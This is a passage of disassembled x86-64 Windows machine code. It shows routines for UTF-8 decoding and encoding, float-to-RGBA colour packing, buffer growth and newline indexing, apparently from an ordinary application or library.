   1400035a9:	41 8b c9             	mov    %r9d,%ecx
   1400035ac:	0f 43 cb             	cmovae %ebx,%ecx
   1400035af:	49 3b c0             	cmp    %r8,%rax
   1400035b2:	73 05                	jae    0x1400035b9
   1400035b4:	0f b6 38             	movzbl (%rax),%edi
   1400035b7:	eb 03                	jmp    0x1400035bc
   1400035b9:	40 32 ff             	xor    %dil,%dil
   1400035bc:	48 8d 42 02          	lea    0x2(%rdx),%rax
   1400035c0:	49 3b c0             	cmp    %r8,%rax
   1400035c3:	73 06                	jae    0x1400035cb
   1400035c5:	44 0f b6 08          	movzbl (%rax),%r9d
   1400035c9:	eb 03                	jmp    0x1400035ce
   1400035cb:	45 32 c9             	xor    %r9b,%r9b
   1400035ce:	48 83 c2 03          	add    $0x3,%rdx
   1400035d2:	49 3b d0             	cmp    %r8,%rdx
   1400035d5:	73 06                	jae    0x1400035dd
   1400035d7:	44 0f b6 02          	movzbl (%rdx),%r8d
   1400035db:	eb 03                	jmp    0x1400035e0
   1400035dd:	45 32 c0             	xor    %r8b,%r8b
   1400035e0:	45 0f b6 f0          	movzbl %r8b,%r14d
   1400035e4:	4e 8d 14 95 00 00 00 	lea    0x0(,%r10,4),%r10
   1400035eb:	00 
   1400035ec:	41 0f b6 e9          	movzbl %r9b,%ebp
   1400035f0:	8b d3                	mov    %ebx,%edx
   1400035f2:	47 8b 8c 22 00 72 04 	mov    0x47200(%r10,%r12,1),%r9d
   1400035f9:	00 
   1400035fa:	44 8b c5             	mov    %ebp,%r8d
   1400035fd:	41 81 e0 c0 00 00 00 	and    $0xc0,%r8d
   140003604:	44 0f b6 f9          	movzbl %cl,%r15d
   140003608:	43 8b 8c 22 a8 28 04 	mov    0x428a8(%r10,%r12,1),%ecx
   14000360f:	00 
   140003610:	45 23 cf             	and    %r15d,%r9d
   140003613:	41 c1 e1 06          	shl    $0x6,%r9d
   140003617:	40 0f b6 ff          	movzbl %dil,%edi
   14000361b:	8b c7                	mov    %edi,%eax
   14000361d:	83 e0 3f             	and    $0x3f,%eax
   140003620:	44 0b c8             	or     %eax,%r9d
   140003623:	8b c5                	mov    %ebp,%eax
   140003625:	83 e0 3f             	and    $0x3f,%eax
   140003628:	41 c1 e1 06          	shl    $0x6,%r9d
   14000362c:	44 0b c8             	or     %eax,%r9d
   14000362f:	41 8b c6             	mov    %r14d,%eax
   140003632:	83 e0 3f             	and    $0x3f,%eax
   140003635:	41 c1 e1 06          	shl    $0x6,%r9d
   140003639:	44 0b c8             	or     %eax,%r9d
   14000363c:	41 8b c6             	mov    %r14d,%eax
   14000363f:	c1 e8 02             	shr    $0x2,%eax
   140003642:	44 0b c0             	or     %eax,%r8d
   140003645:	41 d3 e9             	shr    %cl,%r9d
   140003648:	41 c1 e8 02          	shr    $0x2,%r8d
   14000364c:	b9 80 00 00 00       	mov    $0x80,%ecx
   140003651:	8b c7                	mov    %edi,%eax
   140003653:	44 89 0e             	mov    %r9d,(%rsi)
   140003656:	25 c0 00 00 00       	and    $0xc0,%eax
   14000365b:	44 0b c0             	or     %eax,%r8d
   14000365e:	41 c1 e8 02          	shr    $0x2,%r8d
   140003662:	47 3b 8c 22 90 28 04 	cmp    0x42890(%r10,%r12,1),%r9d
   140003669:	00 
   14000366a:	1b c0                	sbb    %eax,%eax
   14000366c:	83 e0 40             	and    $0x40,%eax
   14000366f:	44 0b c0             	or     %eax,%r8d
   140003672:	41 8b c1             	mov    %r9d,%eax
   140003675:	25 00 f8 ff ff       	and    $0xfffff800,%eax
   14000367a:	3d 00 d8 00 00       	cmp    $0xd800,%eax
   14000367f:	8b c3                	mov    %ebx,%eax
   140003681:	0f 44 d1             	cmove  %ecx,%edx
   140003684:	b9 00 01 00 00       	mov    $0x100,%ecx
   140003689:	44 0b c2             	or     %edx,%r8d
   14000368c:	41 81 f9 ff ff 00 00 	cmp    $0xffff,%r9d
   140003693:	0f 47 c1             	cmova  %ecx,%eax
   140003696:	43 8b 8c 22 e8 71 04 	mov    0x471e8(%r10,%r12,1),%ecx
   14000369d:	00 
   14000369e:	44 0b c0             	or     %eax,%r8d
   1400036a1:	41 83 f0 2a          	xor    $0x2a,%r8d
   1400036a5:	41 d3 f8             	sar    %cl,%r8d
   1400036a8:	45 85 c0             	test   %r8d,%r8d
   1400036ab:	74 31                	je     0x1400036de
   1400036ad:	85 ed                	test   %ebp,%ebp
   1400036af:	c7 06 fd ff 00 00    	movl   $0xfffd,(%rsi)
   1400036b5:	8b c3                	mov    %ebx,%eax
   1400036b7:	8b cb                	mov    %ebx,%ecx
   1400036b9:	0f 95 c1             	setne  %cl
   1400036bc:	85 ff                	test   %edi,%edi
   1400036be:	0f 95 c0             	setne  %al
   1400036c1:	03 c8                	add    %eax,%ecx
   1400036c3:	8b c3                	mov    %ebx,%eax
   1400036c5:	45 85 f6             	test   %r14d,%r14d
   1400036c8:	0f 95 c0             	setne  %al
   1400036cb:	03 c1                	add    %ecx,%eax
   1400036cd:	45 85 ff             	test   %r15d,%r15d
   1400036d0:	0f 95 c3             	setne  %bl
   1400036d3:	03 c3                	add    %ebx,%eax
   1400036d5:	44 3b d8             	cmp    %eax,%r11d
   1400036d8:	41 0f 4c c3          	cmovl  %r11d,%eax
   1400036dc:	eb 03                	jmp    0x1400036e1
   1400036de:	41 8b c3             	mov    %r11d,%eax
   1400036e1:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1400036e6:	48 8b 6c 24 28       	mov    0x28(%rsp),%rbp
   1400036eb:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   1400036f0:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   1400036f5:	41 5f                	pop    %r15
   1400036f7:	41 5e                	pop    %r14
   1400036f9:	41 5c                	pop    %r12
   1400036fb:	c3                   	ret
   1400036fc:	cc                   	int3
   1400036fd:	cc                   	int3
   1400036fe:	cc                   	int3
   1400036ff:	cc                   	int3
   140003700:	41 81 f8 80 00 00 00 	cmp    $0x80,%r8d
   140003707:	73 09                	jae    0x140003712
   140003709:	44 88 01             	mov    %r8b,(%rcx)
   14000370c:	b8 01 00 00 00       	mov    $0x1,%eax
   140003711:	c3                   	ret
   140003712:	41 81 f8 00 08 00 00 	cmp    $0x800,%r8d
   140003719:	73 25                	jae    0x140003740
   14000371b:	83 fa 02             	cmp    $0x2,%edx
   14000371e:	0f 8c 97 00 00 00    	jl     0x1400037bb
   140003724:	41 8b c0             	mov    %r8d,%eax
   140003727:	41 80 e0 3f          	and    $0x3f,%r8b
   14000372b:	c1 e8 06             	shr    $0x6,%eax
   14000372e:	2c 40                	sub    $0x40,%al
   140003730:	41 80 c0 80          	add    $0x80,%r8b
   140003734:	88 01                	mov    %al,(%rcx)
   140003736:	44 88 41 01          	mov    %r8b,0x1(%rcx)
   14000373a:	b8 02 00 00 00       	mov    $0x2,%eax
   14000373f:	c3                   	ret
   140003740:	41 81 f8 00 00 01 00 	cmp    $0x10000,%r8d
   140003747:	73 2e                	jae    0x140003777
   140003749:	83 fa 03             	cmp    $0x3,%edx
   14000374c:	7c 6d                	jl     0x1400037bb
   14000374e:	41 8b c0             	mov    %r8d,%eax
   140003751:	c1 e8 0c             	shr    $0xc,%eax
   140003754:	2c 20                	sub    $0x20,%al
   140003756:	88 01                	mov    %al,(%rcx)
   140003758:	41 8b c0             	mov    %r8d,%eax
   14000375b:	c1 e8 06             	shr    $0x6,%eax
   14000375e:	41 80 e0 3f          	and    $0x3f,%r8b
   140003762:	24 3f                	and    $0x3f,%al
   140003764:	04 80                	add    $0x80,%al
   140003766:	41 80 c0 80          	add    $0x80,%r8b
   14000376a:	88 41 01             	mov    %al,0x1(%rcx)
   14000376d:	44 88 41 02          	mov    %r8b,0x2(%rcx)
   140003771:	b8 03 00 00 00       	mov    $0x3,%eax
   140003776:	c3                   	ret
   140003777:	41 81 f8 ff ff 10 00 	cmp    $0x10ffff,%r8d
   14000377e:	77 3b                	ja     0x1400037bb
   140003780:	83 fa 04             	cmp    $0x4,%edx
   140003783:	7c 36                	jl     0x1400037bb
   140003785:	41 8b c0             	mov    %r8d,%eax
   140003788:	c1 e8 12             	shr    $0x12,%eax
   14000378b:	2c 10                	sub    $0x10,%al
   14000378d:	88 01                	mov    %al,(%rcx)
   14000378f:	41 8b c0             	mov    %r8d,%eax
   140003792:	c1 e8 0c             	shr    $0xc,%eax
   140003795:	24 3f                	and    $0x3f,%al
   140003797:	04 80                	add    $0x80,%al
   140003799:	88 41 01             	mov    %al,0x1(%rcx)
   14000379c:	41 8b c0             	mov    %r8d,%eax
   14000379f:	c1 e8 06             	shr    $0x6,%eax
   1400037a2:	41 80 e0 3f          	and    $0x3f,%r8b
   1400037a6:	24 3f                	and    $0x3f,%al
   1400037a8:	04 80                	add    $0x80,%al
   1400037aa:	41 80 c0 80          	add    $0x80,%r8b
   1400037ae:	88 41 02             	mov    %al,0x2(%rcx)
   1400037b1:	44 88 41 03          	mov    %r8b,0x3(%rcx)
   1400037b5:	b8 04 00 00 00       	mov    $0x4,%eax
   1400037ba:	c3                   	ret
   1400037bb:	33 c0                	xor    %eax,%eax
   1400037bd:	c3                   	ret
   1400037be:	cc                   	int3
   1400037bf:	cc                   	int3
   1400037c0:	f3 0f 10 11          	movss  (%rcx),%xmm2
   1400037c4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400037c7:	0f 2f c2             	comiss %xmm2,%xmm0
   1400037ca:	f3 0f 10 1d 12 4a 04 	movss  0x44a12(%rip),%xmm3        # 0x1400481e4
   1400037d1:	00 
   1400037d2:	76 05                	jbe    0x1400037d9
   1400037d4:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400037d7:	eb 07                	jmp    0x1400037e0
   1400037d9:	0f 28 cb             	movaps %xmm3,%xmm1
   1400037dc:	f3 0f 5d ca          	minss  %xmm2,%xmm1
   1400037e0:	f3 0f 10 61 04       	movss  0x4(%rcx),%xmm4
   1400037e5:	0f 2f c4             	comiss %xmm4,%xmm0
   1400037e8:	76 05                	jbe    0x1400037ef
   1400037ea:	0f 57 d2             	xorps  %xmm2,%xmm2
   1400037ed:	eb 07                	jmp    0x1400037f6
   1400037ef:	0f 28 d3             	movaps %xmm3,%xmm2
   1400037f2:	f3 0f 5d d4          	minss  %xmm4,%xmm2
   1400037f6:	f3 0f 10 25 b6 4a 04 	movss  0x44ab6(%rip),%xmm4        # 0x1400482b4
   1400037fd:	00 
   1400037fe:	f3 0f 10 2d aa 49 04 	movss  0x449aa(%rip),%xmm5        # 0x1400481b0
   140003805:	00 
   140003806:	f3 0f 59 d4          	mulss  %xmm4,%xmm2
   14000380a:	f3 0f 59 cc          	mulss  %xmm4,%xmm1
   14000380e:	f3 0f 58 d5          	addss  %xmm5,%xmm2
   140003812:	f3 0f 58 cd          	addss  %xmm5,%xmm1
   140003816:	f3 0f 2c d2          	cvttss2si %xmm2,%edx
   14000381a:	f3 0f 10 51 08       	movss  0x8(%rcx),%xmm2
   14000381f:	c1 e2 08             	shl    $0x8,%edx
   140003822:	f3 0f 2c c1          	cvttss2si %xmm1,%eax
   140003826:	0b d0                	or     %eax,%edx
   140003828:	0f 2f c2             	comiss %xmm2,%xmm0
   14000382b:	76 05                	jbe    0x140003832
   14000382d:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003830:	eb 07                	jmp    0x140003839
   140003832:	0f 28 cb             	movaps %xmm3,%xmm1
   140003835:	f3 0f 5d ca          	minss  %xmm2,%xmm1
   140003839:	f3 0f 59 cc          	mulss  %xmm4,%xmm1
   14000383d:	f3 0f 58 cd          	addss  %xmm5,%xmm1
   140003841:	f3 0f 2c c1          	cvttss2si %xmm1,%eax
   140003845:	f3 0f 10 49 0c       	movss  0xc(%rcx),%xmm1
   14000384a:	c1 e0 10             	shl    $0x10,%eax
   14000384d:	0b d0                	or     %eax,%edx
   14000384f:	0f 2f c1             	comiss %xmm1,%xmm0
   140003852:	77 07                	ja     0x14000385b
   140003854:	0f 28 c3             	movaps %xmm3,%xmm0
   140003857:	f3 0f 5d c1          	minss  %xmm1,%xmm0
   14000385b:	f3 0f 59 c4          	mulss  %xmm4,%xmm0
   14000385f:	f3 0f 58 c5          	addss  %xmm5,%xmm0
   140003863:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
   140003867:	c1 e0 18             	shl    $0x18,%eax
   14000386a:	0b c2                	or     %edx,%eax
   14000386c:	c3                   	ret
   14000386d:	cc                   	int3
   14000386e:	cc                   	int3
   14000386f:	cc                   	int3
   140003870:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003875:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000387a:	57                   	push   %rdi
   14000387b:	48 83 ec 20          	sub    $0x20,%rsp
   14000387f:	8b 01                	mov    (%rcx),%eax
   140003881:	be 01 00 00 00       	mov    $0x1,%esi
   140003886:	8b 51 04             	mov    0x4(%rcx),%edx
   140003889:	85 c0                	test   %eax,%eax
   14000388b:	48 8b d9             	mov    %rcx,%rbx
   14000388e:	0f 45 f0             	cmovne %eax,%esi
   140003891:	8d 7e 01             	lea    0x1(%rsi),%edi
   140003894:	3b fa                	cmp    %edx,%edi
   140003896:	7c 0c                	jl     0x1400038a4
   140003898:	03 d2                	add    %edx,%edx
   14000389a:	3b fa                	cmp    %edx,%edi
   14000389c:	0f 4f d7             	cmovg  %edi,%edx
   14000389f:	e8 fc 75 01 00       	call   0x14001aea0
   1400038a4:	8b 4b 04             	mov    0x4(%rbx),%ecx
   1400038a7:	3b f9                	cmp    %ecx,%edi
   1400038a9:	7e 23                	jle    0x1400038ce
   1400038ab:	85 c9                	test   %ecx,%ecx
   1400038ad:	74 0b                	je     0x1400038ba
   1400038af:	8b c1                	mov    %ecx,%eax
   1400038b1:	99                   	cltd
   1400038b2:	2b c2                	sub    %edx,%eax
   1400038b4:	d1 f8                	sar    $1,%eax
   1400038b6:	03 c1                	add    %ecx,%eax
   1400038b8:	eb 05                	jmp    0x1400038bf
   1400038ba:	b8 08 00 00 00       	mov    $0x8,%eax
   1400038bf:	3b c7                	cmp    %edi,%eax
   1400038c1:	8b d7                	mov    %edi,%edx
   1400038c3:	48 8b cb             	mov    %rbx,%rcx
   1400038c6:	0f 4f d0             	cmovg  %eax,%edx
   1400038c9:	e8 d2 75 01 00       	call   0x14001aea0
   1400038ce:	89 3b                	mov    %edi,(%rbx)
   1400038d0:	8d 46 ff             	lea    -0x1(%rsi),%eax
   1400038d3:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400038d7:	48 63 d0             	movslq %eax,%rdx
   1400038da:	0f b7 05 8f ee 03 00 	movzwl 0x3ee8f(%rip),%eax        # 0x140042770
   1400038e1:	88 04 0a             	mov    %al,(%rdx,%rcx,1)
   1400038e4:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400038e8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400038ed:	48 63 ce             	movslq %esi,%rcx
   1400038f0:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400038f5:	c6 04 01 00          	movb   $0x0,(%rcx,%rax,1)
   1400038f9:	48 83 c4 20          	add    $0x20,%rsp
   1400038fd:	5f                   	pop    %rdi
   1400038fe:	c3                   	ret
   1400038ff:	cc                   	int3
   140003900:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140003905:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000390a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000390f:	48 83 ec 28          	sub    $0x28,%rsp
   140003913:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140003918:	e8 13 00 00 00       	call   0x140003930
   14000391d:	48 83 c4 28          	add    $0x28,%rsp
   140003921:	c3                   	ret
   140003922:	cc                   	int3
   140003923:	cc                   	int3
   140003924:	cc                   	int3
   140003925:	cc                   	int3
   140003926:	cc                   	int3
   140003927:	cc                   	int3
   140003928:	cc                   	int3
   140003929:	cc                   	int3
   14000392a:	cc                   	int3
   14000392b:	cc                   	int3
   14000392c:	cc                   	int3
   14000392d:	cc                   	int3
   14000392e:	cc                   	int3
   14000392f:	cc                   	int3
   140003930:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140003935:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000393a:	57                   	push   %rdi
   14000393b:	41 54                	push   %r12
   14000393d:	41 57                	push   %r15
   14000393f:	48 83 ec 30          	sub    $0x30,%rsp
   140003943:	49 8b e8             	mov    %r8,%rbp
   140003946:	4c 8b fa             	mov    %rdx,%r15
   140003949:	48 8b f9             	mov    %rcx,%rdi
   14000394c:	e8 5f d9 ff ff       	call   0x1400012b0
   140003951:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140003956:	4d 8b cf             	mov    %r15,%r9
   140003959:	45 33 c0             	xor    %r8d,%r8d
   14000395c:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003963:	00 00 
   140003965:	33 d2                	xor    %edx,%edx
   140003967:	4c 8b e0             	mov    %rax,%r12
   14000396a:	48 8b 08             	mov    (%rax),%rcx
   14000396d:	48 83 c9 01          	or     $0x1,%rcx
   140003971:	ff 15 11 dc 03 00    	call   *0x3dc11(%rip)        # 0x140041588
   140003977:	8b f0                	mov    %eax,%esi
   140003979:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000397e:	85 f6                	test   %esi,%esi
   140003980:	0f 48 f0             	cmovs  %eax,%esi
   140003983:	85 f6                	test   %esi,%esi
   140003985:	0f 8e c1 00 00 00    	jle    0x140003a4c
   14000398b:	8b 0f                	mov    (%rdi),%ecx
   14000398d:	85 c9                	test   %ecx,%ecx
   14000398f:	8b 57 04             	mov    0x4(%rdi),%edx
   140003992:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140003997:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000399c:	41 be 01 00 00 00    	mov    $0x1,%r14d
   1400039a2:	44 0f 45 f1          	cmovne %ecx,%r14d
   1400039a6:	41 8d 1c 36          	lea    (%r14,%rsi,1),%ebx
   1400039aa:	3b da                	cmp    %edx,%ebx
   1400039ac:	7c 0f                	jl     0x1400039bd
   1400039ae:	03 d2                	add    %edx,%edx
   1400039b0:	48 8b cf             	mov    %rdi,%rcx
   1400039b3:	3b da                	cmp    %edx,%ebx
   1400039b5:	0f 4f d3             	cmovg  %ebx,%edx
   1400039b8:	e8 e3 74 01 00       	call   0x14001aea0
   1400039bd:	8b 4f 04             	mov    0x4(%rdi),%ecx
   1400039c0:	3b d9                	cmp    %ecx,%ebx
   1400039c2:	7e 23                	jle    0x1400039e7
   1400039c4:	85 c9                	test   %ecx,%ecx
   1400039c6:	74 0b                	je     0x1400039d3
   1400039c8:	8b c1                	mov    %ecx,%eax
   1400039ca:	99                   	cltd
   1400039cb:	2b c2                	sub    %edx,%eax
   1400039cd:	d1 f8                	sar    $1,%eax
   1400039cf:	03 c1                	add    %ecx,%eax
   1400039d1:	eb 05                	jmp    0x1400039d8
   1400039d3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400039d8:	3b c3                	cmp    %ebx,%eax
   1400039da:	8b d3                	mov    %ebx,%edx
   1400039dc:	48 8b cf             	mov    %rdi,%rcx
   1400039df:	0f 4f d0             	cmovg  %eax,%edx
   1400039e2:	e8 b9 74 01 00       	call   0x14001aea0
   1400039e7:	89 1f                	mov    %ebx,(%rdi)
   1400039e9:	41 8d 46 ff          	lea    -0x1(%r14),%eax
   1400039ed:	48 8b 7f 08          	mov    0x8(%rdi),%rdi
   1400039f1:	4d 8b cf             	mov    %r15,%r9
   1400039f4:	48 63 c8             	movslq %eax,%rcx
   1400039f7:	48 03 f9             	add    %rcx,%rdi
   1400039fa:	48 63 de             	movslq %esi,%rbx
   1400039fd:	49 8b 0c 24          	mov    (%r12),%rcx
   140003a01:	48 ff c3             	inc    %rbx
   140003a04:	48 83 c9 01          	or     $0x1,%rcx
   140003a08:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140003a0d:	4c 8b c3             	mov    %rbx,%r8
   140003a10:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003a17:	00 00 
   140003a19:	48 8b d7             	mov    %rdi,%rdx
   140003a1c:	ff 15 66 db 03 00    	call   *0x3db66(%rip)        # 0x140041588
   140003a22:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   140003a27:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140003a2c:	85 c0                	test   %eax,%eax
   140003a2e:	0f 48 c1             	cmovs  %ecx,%eax
   140003a31:	48 85 ff             	test   %rdi,%rdi
   140003a34:	74 11                	je     0x140003a47
   140003a36:	3b c1                	cmp    %ecx,%eax
   140003a38:	74 04                	je     0x140003a3e
   140003a3a:	3b c3                	cmp    %ebx,%eax
   140003a3c:	7c 03                	jl     0x140003a41
   140003a3e:	8d 43 ff             	lea    -0x1(%rbx),%eax
   140003a41:	48 98                	cltq
   140003a43:	c6 04 38 00          	movb   $0x0,(%rax,%rdi,1)
   140003a47:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003a4c:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140003a51:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140003a56:	48 83 c4 30          	add    $0x30,%rsp
   140003a5a:	41 5f                	pop    %r15
   140003a5c:	41 5c                	pop    %r12
   140003a5e:	5f                   	pop    %rdi
   140003a5f:	c3                   	ret
   140003a60:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003a65:	57                   	push   %rdi
   140003a66:	41 56                	push   %r14
   140003a68:	41 57                	push   %r15
   140003a6a:	48 83 ec 20          	sub    $0x20,%rsp
   140003a6e:	4d 63 f1             	movslq %r9d,%r14
   140003a71:	4c 8b fa             	mov    %rdx,%r15
   140003a74:	49 63 f8             	movslq %r8d,%rdi
   140003a77:	48 8b d9             	mov    %rcx,%rbx
   140003a7a:	41 3b fe             	cmp    %r14d,%edi
   140003a7d:	0f 84 fc 00 00 00    	je     0x140003b7f
   140003a83:	48 63 41 10          	movslq 0x10(%rcx),%rax
   140003a87:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140003a8c:	85 c0                	test   %eax,%eax
   140003a8e:	74 07                	je     0x140003a97
   140003a90:	80 7c 10 ff 0a       	cmpb   $0xa,-0x1(%rax,%rdx,1)
   140003a95:	75 43                	jne    0x140003ada
   140003a97:	8b 49 04             	mov    0x4(%rcx),%ecx
   140003a9a:	44 8b 03             	mov    (%rbx),%r8d
   140003a9d:	44 3b c1             	cmp    %ecx,%r8d
   140003aa0:	75 29                	jne    0x140003acb
   140003aa2:	41 ff c0             	inc    %r8d
   140003aa5:	85 c9                	test   %ecx,%ecx
   140003aa7:	74 0b                	je     0x140003ab4
   140003aa9:	8b c1                	mov    %ecx,%eax
   140003aab:	99                   	cltd
   140003aac:	2b c2                	sub    %edx,%eax
   140003aae:	d1 f8                	sar    $1,%eax
   140003ab0:	03 c1                	add    %ecx,%eax
   140003ab2:	eb 05                	jmp    0x140003ab9
   140003ab4:	b8 08 00 00 00       	mov    $0x8,%eax
   140003ab9:	41 3b c0             	cmp    %r8d,%eax
   140003abc:	48 8b cb             	mov    %rbx,%rcx
   140003abf:	44 0f 4f c0          	cmovg  %eax,%r8d
   140003ac3:	41 8b d0             	mov    %r8d,%edx
   140003ac6:	e8 15 80 01 00       	call   0x14001bae0
   140003acb:	48 63 13             	movslq (%rbx),%rdx
   140003ace:	8b 43 10             	mov    0x10(%rbx),%eax
   140003ad1:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140003ad5:	89 04 91             	mov    %eax,(%rcx,%rdx,4)
   140003ad8:	ff 03                	incl   (%rbx)
   140003ada:	49 8d 0c 3f          	lea    (%r15,%rdi,1),%rcx
   140003ade:	ba 0a 00 00 00       	mov    $0xa,%edx
   140003ae3:	4b 8d 2c 37          	lea    (%r15,%r14,1),%rbp
   140003ae7:	4c 8b c5             	mov    %rbp,%r8
   140003aea:	4c 2b c1             	sub    %rcx,%r8
   140003aed:	e8 65 bd 03 00       	call   0x14003f857
   140003af2:	48 8b f8             	mov    %rax,%rdi
   140003af5:	48 85 c0             	test   %rax,%rax
   140003af8:	74 73                	je     0x140003b6d
   140003afa:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140003aff:	90                   	nop
   140003b00:	48 ff c7             	inc    %rdi
   140003b03:	48 3b fd             	cmp    %rbp,%rdi
   140003b06:	73 45                	jae    0x140003b4d
   140003b08:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140003b0b:	8b f7                	mov    %edi,%esi
   140003b0d:	44 8b 03             	mov    (%rbx),%r8d
   140003b10:	41 2b f7             	sub    %r15d,%esi
   140003b13:	44 3b c1             	cmp    %ecx,%r8d
   140003b16:	75 29                	jne    0x140003b41
   140003b18:	41 ff c0             	inc    %r8d
   140003b1b:	85 c9                	test   %ecx,%ecx
   140003b1d:	74 0b                	je     0x140003b2a
   140003b1f:	8b c1                	mov    %ecx,%eax
   140003b21:	99                   	cltd
   140003b22:	2b c2                	sub    %edx,%eax
   140003b24:	d1 f8                	sar    $1,%eax
   140003b26:	03 c1                	add    %ecx,%eax
   140003b28:	eb 05                	jmp    0x140003b2f
   140003b2a:	b8 08 00 00 00       	mov    $0x8,%eax
   140003b2f:	41 3b c0             	cmp    %r8d,%eax
   140003b32:	48 8b cb             	mov    %rbx,%rcx
   140003b35:	44 0f 4f c0          	cmovg  %eax,%r8d
   140003b39:	41 8b d0             	mov    %r8d,%edx
   140003b3c:	e8 9f 7f 01 00       	call   0x14001bae0
   140003b41:	48 63 13             	movslq (%rbx),%rdx
   140003b44:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140003b48:	89 34 90             	mov    %esi,(%rax,%rdx,4)
   140003b4b:	ff 03                	incl   (%rbx)
   140003b4d:	4c 8b c5             	mov    %rbp,%r8
   140003b50:	ba 0a 00 00 00       	mov    $0xa,%edx
   140003b55:	4c 2b c7             	sub    %rdi,%r8
   140003b58:	48 8b cf             	mov    %rdi,%rcx
   140003b5b:	e8 f7 bc 03 00       	call   0x14003f857
   140003b60:	48 8b f8             	mov    %rax,%rdi
   140003b63:	48 85 c0             	test   %rax,%rax
   140003b66:	75 98                	jne    0x140003b00
   140003b68:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140003b6d:	44 39 73 10          	cmp    %r14d,0x10(%rbx)
   140003b71:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140003b76:	44 0f 4d 73 10       	cmovge 0x10(%rbx),%r14d
   140003b7b:	44 89 73 10          	mov    %r14d,0x10(%rbx)
   140003b7f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003b84:	48 83 c4 20          	add    $0x20,%rsp
   140003b88:	41 5f                	pop    %r15
   140003b8a:	41 5e                	pop    %r14
   140003b8c:	5f                   	pop    %rdi
   140003b8d:	c3                   	ret
   140003b8e:	cc                   	int3
   140003b8f:	cc                   	int3
   140003b90:	40 57                	rex push %rdi
   140003b92:	48 83 ec 40          	sub    $0x40,%rsp
   140003b96:	48 8b 3d 63 bc 04 00 	mov    0x4bc63(%rip),%rdi        # 0x14004f800
   140003b9d:	48 63 c1             	movslq %ecx,%rax
   140003ba0:	0f 29 74 24 30       	movaps %xmm6,0x30(%rsp)
   140003ba5:	0f 28 f1             	movaps %xmm1,%xmm6
   140003ba8:	48 8d 14 40          	lea    (%rax,%rax,2),%rdx
   140003bac:	48 8d 05 1d ee 03 00 	lea    0x3ee1d(%rip),%rax        # 0x1400429d0
   140003bb3:	83 3c 90 08          	cmpl   $0x8,(%rax,%rdx,4)
   140003bb7:	75 42                	jne    0x140003bfb
   140003bb9:	83 7c 90 04 01       	cmpl   $0x1,0x4(%rax,%rdx,4)
   140003bbe:	75 3b                	jne    0x140003bfb
   140003bc0:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140003bc4:	48 8d 8f 30 48 00 00 	lea    0x4830(%rdi),%rcx
   140003bcb:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140003bd0:	8b 5c 90 08          	mov    0x8(%rax,%rdx,4),%ebx
   140003bd4:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003bd9:	f3 0f 10 84 3b c8 37 	movss  0x37c8(%rbx,%rdi,1),%xmm0
   140003be0:	00 00 
   140003be2:	f3 0f 11 44 24 24    	movss  %xmm0,0x24(%rsp)
   140003be8:	e8 b3 6c 01 00       	call   0x14001a8a0
   140003bed:	f3 0f 11 b4 3b c8 37 	movss  %xmm6,0x37c8(%rbx,%rdi,1)
   140003bf4:	00 00 
   140003bf6:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003bfb:	0f 28 74 24 30       	movaps 0x30(%rsp),%xmm6
   140003c00:	48 83 c4 40          	add    $0x40,%rsp
   140003c04:	5f                   	pop    %rdi
   140003c05:	c3                   	ret
   140003c06:	cc                   	int3
   140003c07:	cc                   	int3
   140003c08:	cc                   	int3
   140003c09:	cc                   	int3
   140003c0a:	cc                   	int3
   140003c0b:	cc                   	int3
   140003c0c:	cc                   	int3
   140003c0d:	cc                   	int3
   140003c0e:	cc                   	int3
   140003c0f:	cc                   	int3
   140003c10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003c15:	48 8b 15 e4 bb 04 00 	mov    0x4bbe4(%rip),%rdx        # 0x14004f800
   140003c1c:	48 8d 1d ad ed 03 00 	lea    0x3edad(%rip),%rbx        # 0x1400429d0
   140003c23:	44 8b d1             	mov    %ecx,%r10d
   140003c26:	44 8b 82 30 48 00 00 	mov    0x4830(%rdx),%r8d
   140003c2d:	44 3b c1             	cmp    %ecx,%r8d
